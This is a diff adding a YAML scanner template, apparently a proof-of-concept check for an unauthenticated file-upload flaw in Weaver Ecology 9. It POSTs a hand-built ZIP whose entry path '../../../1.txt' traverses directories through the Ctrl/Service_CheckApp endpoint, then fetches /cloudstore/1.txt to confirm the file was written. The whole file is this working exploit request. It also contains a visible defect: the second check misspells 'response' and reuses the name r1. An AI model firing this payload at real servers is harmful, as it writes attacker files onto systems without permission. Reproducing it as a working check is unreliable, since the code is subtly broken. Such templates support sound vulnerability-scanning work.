@@ -1,0 +1,24 @@
+name: ecology9-ctrl-file-upload
+transport: http
+set:
+  r1: '".css"'
+  r2: b"PK\x03\x04\x14\x00\x00\x00\x08\x00\x1d\x5b\x19U\x3dQkM\x05\x00\x00\x00\x03\x00\x00\x00\x0e\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f1\x2etxt344\x04\x00PK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\x1d\x5b\x19U\x3dQkM\x05\x00\x00\x00\x03\x00\x00\x00\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x01\x00\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f1\x2etxtPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\x3c\x00\x00\x001\x00\x00\x00\x00\x00"
+rules:
+  r0:
+    request:
+      method: POST
+      path: /weaver/weaver.common.Ctrl/{{r1}}?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp
+      body: '{{r2}}'
+      headers:
+        Content-Type: application/octet-stream
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /cloudstore/1.txt
+    expression: resoponse.status == 200
+expression: r0() && r1()
+detail:
+  author: trganda
+  links:
+    - https://www.weaver.com.cn/cs/securityDownload.asp
